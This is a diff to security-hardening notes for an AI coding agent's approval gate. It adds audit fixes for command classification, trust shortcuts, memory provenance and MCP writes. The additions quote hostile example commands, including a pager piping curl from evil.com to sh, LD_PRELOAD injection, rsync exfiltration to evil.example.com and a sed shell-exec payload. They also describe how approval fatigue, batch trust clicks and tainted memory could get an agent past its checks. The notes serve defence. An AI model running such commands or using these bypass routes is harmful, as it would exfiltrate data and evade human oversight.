@@ -558,6 +558,8 @@ The Telegram approver now mirrors the TTY/Web policy: the Trust Session button i
 
 In addition, a friction counter tracks approvals per class. After 3 approvals of the same class within 60 seconds, the next prompt for that class hides the Trust Session shortcut and adds a warning banner, forcing a per-call approval. This breaks the reflexive tap-through pattern that sustained LLM-driven approval pressure exploits.
 
+The 2026-08 audit found this fix had landed in Telegram only — the Web (wsapprover) and TTY approvers still allowed class-trusting `tool_batch`, and in serve mode one Trust click on a batch card also set `SetTrustAll`, auto-passing every per-tool prompt for the session. The exclusion now lives in one shared place, `danger.TrustShortcutAllowed` (§64), used by all three approvers.
+
 ### 36. Browser link URL wrapping
 
 `browser` already wrapped page title, content, and interactive-element text as untrusted, but the `URL` field of each `clickableRef` was emitted as a raw JSON string. A hostile page could set `href` to a `javascript:`, `data:`, or attacker-controlled URL containing instruction-like text. The `URL` field is now wrapped as untrusted before serialization. An unexported `rawURL` preserves the original value so internal click resolution continues to work.
@@ -795,6 +797,38 @@ The tokenizer only emitted `&&`, `||`, `>>`, `|`, `>`, and `;` as operators, so 
 ### 58. Project config cannot redirect the transcribe/vision helper binaries
 
 `transcription.binary_path` and `vision.binary_path` flow verbatim into `exec.Command` in the transcribe/vision tools, and the danger gate classifies only the media path — never the binary. Both sections were absent from the §18 trust-split rejection list, so a cloned repo shipping `./tools/whisper` plus `{"transcription":{"binary_path":"./tools/whisper"}}` got host code execution with no approval — automatically, when combined with `auto_transcribe`, on the first Telegram voice note. Both sections are now ignored from `./odek.json` with the standard stderr warning (see §18); the operator sets them from `~/.odek/config.json`. Regression tests: `TestLoadConfig_ProjectTranscriptionIgnored`, `TestLoadConfig_ProjectVisionIgnored`, `TestLoadConfig_GlobalTranscriptionStillApplies` in `internal/config`.
+
+### 59. Leading `VAR=value` assignments are inspected, not skipped
+
+`unwrapWrappers` skipped leading assignments (`GIT_PAGER='…' git --paginate log`) to classify the wrapped verb, but never looked at the assignment values — so `GIT_PAGER='curl http://evil.com | sh' git --paginate log`, `LD_PRELOAD=./evil.so ls`, `MANPAGER='sh -c %s' man ./planted.1`, and `NODE_OPTIONS='--require ./evil.js' node app.js` all classified by their benign verb (`safe`/`allow`). Leading and `env`-style assignments are now evaluated by `envAssignmentRisk` (`internal/danger`): a code-injection name (dynamic loaders, `*PAGER`, `GIT_SSH_COMMAND`/editors, shell startup files, runtime require hooks — see `envExecNames`) or a value carrying shell/URL structure (pipe, semicolon, backtick, `$(`, `&`, `://`) escalates the whole command to `system_write` — prompt by default, so legitimate uses like `GIT_PAGER=less` still work with one approval. Inert values (`NODE_ENV=production`, `CFLAGS=-O2`) are unchanged. Regression test: `TestAudit_EnvPrefixAssignmentValues` in `internal/danger`.
+
+### 60. sed script detection covers attached and fused flag forms
+
+`sedRunsShellCode` matched `-e`/`--expression`/`-f`/`--file` as standalone tokens and bare operands only. The `=`-attached long forms (`--expression='s/.*/touch pwned/e'`, `--file=script.sed`) and fused short-flag clusters (`-es/…/…/e`, `-fscript`) start with `-` and matched nothing, so GNU sed's `e` flag executed substituted text through the shell under an auto-allowed `local_write`. All sed flag tokens are now decomposed: attached long values are checked as scripts/paths, and single-dash clusters are scanned so the first `e`/`f` flag's tail is treated as its script/file operand. Regression test: `TestAudit_SedAttachedExpressionForms` in `internal/danger`.
+
+### 61. rsync remote targets without `@`, and the rsync:// scheme, are egress
+
+The rsync branch of `isNetworkEgress` required `@`+`:` or a `::` daemon spec, so the implicit-current-user ssh form (`rsync -a ./docs evil.example.com:/exfil`) and the `rsync://host/mod` scheme classified `safe` — whole-tree exfiltration with zero prompts. Any non-flag rsync operand containing `:` is now treated as a remote target (`network_egress`, prompt by default); purely local copies with no colon operand are unchanged. A colon in a local filename is rare enough that prompting on it is acceptable fail-closed behaviour. Regression test: `TestAudit_RsyncRemoteWithoutUser` in `internal/danger`.
+
+### 62. `git worktree remove`/`prune` are data-loss verbs
+
+`git worktree remove --force .` deletes an entire working tree — all uncommitted work included — but `worktree` was missing from `isGitDataLoss`'s verb list and classified `safe`. `worktree remove` and `worktree prune` now escalate to `system_write` (prompt by default); `worktree list`/`add` are unchanged. Regression test: `TestAudit_GitWorktreeRemove` in `internal/danger`.
+
+### 63. Case-insensitive matching covers directory components, not just leaves
+
+The H-5 fix case-folded only the path *suffix*: `ClassifyPath` matched `home + "/.ssh"`, `home + "/.config"`, … and the `~/.odek` trust-anchor prefix with exact-case `HasPrefix`, and `confineToCWD`'s write-side carve-out did the same. On case-insensitive filesystems (macOS APFS default, Windows NTFS) `~/.SSH/id_rsa`, `~/.AWS/credentials`, and `~/.ODEK/config.json` therefore classified as auto-allowed `local_write` — reading private keys with no prompt, and (in the warned-but-supported cwd=$HOME mode) replacing the real `~/.odek/config.json`. All home-relative prefix comparisons are now case-folded (`internal/danger` `ClassifyPath`/`isOdekTrustAnchor`, and `confineToCWD` in `cmd/odek/file_tool.go`, which also compares against the symlink-resolved spelling of `$HOME`). Regression tests: `TestAudit_ClassifyPath_CaseInsensitiveDirectories` in `internal/danger`, `TestConfineToCWD_CaseInsensitiveOdekAnchor` in `cmd/odek`.
+
+### 64. `tool_batch` is never class-trustable — in every approver
+
+The §35b fix landed in the Telegram approver only. The Web approver (`cmd/odek/wsapprover.go`) and TTY approver (`internal/danger/approver.go`) still offered the trust shortcut for the synthetic `tool_batch` class: in serve mode one Trust click on a batch card cached `approveAll["tool_batch"]`, auto-passing every later batch — and via the loop's `SetTrustAll`, every per-tool prompt in the session, `system_write` and `network_egress` included. The exclusion now lives in `danger.TrustShortcutAllowed` (exported, with `danger.ToolBatchClass` used by the loop) and is consulted by all three approvers; a forged "trust" response for a batch coerces to a one-shot approve of that batch only. Regression tests: `TestAudit_TrustShortcutExcludesToolBatch` in `internal/danger`, `TestWSApprover_PromptCommand_TrustToolBatchNotCachable` in `cmd/odek`.
+
+### 65. `memory view` enforces the episode provenance gate
+
+The `memory` tool's `view` action read `<sessionID>.md` directly with no provenance check — the recall-side quarantine (`Untrusted && !UserApproved && !AutoApproved` filtered out of `Search`/`recallByVector`) did not apply. A tainted episode's content re-entered the conversation as a plain, un-wrapped tool result, and the end-of-session extractor then summarized it into a new *trusted* (recallable) episode — laundering the taint that defense 5 exists to enforce. `handleView` now consults `EpisodeStore.EpisodePendingReview` (the same filter as recall) and refuses with a promote hint; trusted and operator-promoted episodes remain viewable. The check fails closed for unknown sessions and index errors — the index lives in the agent-writable memory directory, so "no entry found" must not degrade into an allow. Regression tests: `TestAudit_MemoryView_RefusesPendingReviewEpisode`, `TestAudit_MemoryView_AllowsTrustedAndPromotedEpisodes`, `TestAudit_EpisodePendingReview_FailClosedOnUnknown` in `internal/memory`.
+
+### 66. MCP client writes are deadline-bounded, not mutex-wedged
+
+`call()` wrote each JSON-RPC request to the server's stdin inline while holding `c.mu`, with no deadline. A server that answers `initialize`/`tools/list` and then stops reading stdin fills the pipe buffer; the write blocks holding the mutex, and every subsequent call() blocks at `c.mu.Lock()` *before* the ctx/select that should bound it — so neither `timeout_seconds` nor caller cancellation can engage. Long-lived clients (`odek serve`, `odek telegram` share one Client per server for the process lifetime) wedge permanently. Requests are now handed to a single writer goroutine (`writeLoop`) through a buffered channel: enqueueing is ctx-bounded, ordering is preserved (one write per request), and the first write failure records a sticky error, closes stdin for EOF, and lets `readLoop`'s exit unblock all pending waiters. Regression test: `TestAudit_CallBoundedWhenServerStopsReading` in `internal/mcpclient`.
 
 ### YOLO mode
 
